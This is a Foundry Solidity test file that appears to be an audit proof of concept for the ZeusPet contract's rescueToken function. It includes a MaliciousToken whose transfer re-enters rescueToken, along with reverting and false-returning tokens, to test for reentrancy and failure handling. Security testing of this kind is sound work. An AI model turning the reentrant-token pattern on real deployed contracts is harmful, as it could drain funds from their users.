// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/ZeusPet.sol";

contract MaliciousToken {
    ZeusPet public zeusPet;
    bool public attackTriggered = false;

    function setZeusPet(address _zeusPet) external {
        zeusPet = ZeusPet(_zeusPet);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        if (!attackTriggered) {
            attackTriggered = true;
            try zeusPet.rescueToken(IERC20(address(this)), to, amount) {} catch {}
        }
        return true;
    }
}

contract AlwaysRevertsToken {
    mapping(address => uint256) public balanceOf;

    constructor() {
        balanceOf[msg.sender] = 1000000 ether;
    }

    function transfer(address, uint256) external pure returns (bool) {
        revert("Transfer failed");
    }
}

contract ReturnsFalseToken {
    mapping(address => uint256) public balanceOf;

    constructor() {
        balanceOf[msg.sender] = 1000000 ether;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return false;
    }
}

contract ZeusPetRescueTokenTest is Test {
    ZeusPet public zeusPet;
    MaliciousToken public maliciousToken;
    AlwaysRevertsToken public revertingToken;
    ReturnsFalseToken public falseToken;
    
    address public owner = address(0x1);
    address public marketingWallet = address(0x3);

    function setUp() public {
        vm.startPrank(owner);
        zeusPet = new ZeusPet(1, 1, marketingWallet);
        maliciousToken = new MaliciousToken();
        maliciousToken.setZeusPet(address(zeusPet));
        
        revertingToken = new AlwaysRevertsToken();
        falseToken = new ReturnsFalseToken();
        vm.stopPrank();
    }

    function testRescueTokenReentrancy() public {
        console.log("--- BEFORE-Trigger State ---");
        bool attackTriggeredBefore = maliciousToken.attackTriggered();
        console.log("attackTriggered before: ", attackTriggeredBefore);

        console.log("--- Trigger RescueToken ---");
        vm.prank(owner);
        zeusPet.rescueToken(IERC20(address(maliciousToken)), owner, 100 ether);

        console.log("--- AFTER-Trigger State ---");
        bool attackTriggeredAfter = maliciousToken.attackTriggered();
        console.log("attackTriggered after:  ", attackTriggeredAfter);
        
        bool vulnerabilityExists = attackTriggeredAfter;
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Reentrancy attack successfully triggered during token rescue");
        } else {
            console.log("Vulnerability not Exist: No reentrancy triggered");
        }
        
        assertTrue(vulnerabilityExists);
    }

    function testRescueTokenRevertOnFailure() public {
        vm.prank(owner);
        vm.expectRevert("Transfer failed");
        zeusPet.rescueToken(IERC20(address(revertingToken)), owner, 100 ether);
        console.log("Vulnerability not Exist: Revert on transfer failure handled correctly");
    }

    function testRescueTokenReturnsFalse() public {
        vm.prank(owner);
        vm.expectRevert("Unable to transfer token");
        zeusPet.rescueToken(IERC20(address(falseToken)), owner, 100 ether);
        console.log("Vulnerability not Exist: False return from transfer handled correctly");
    }
}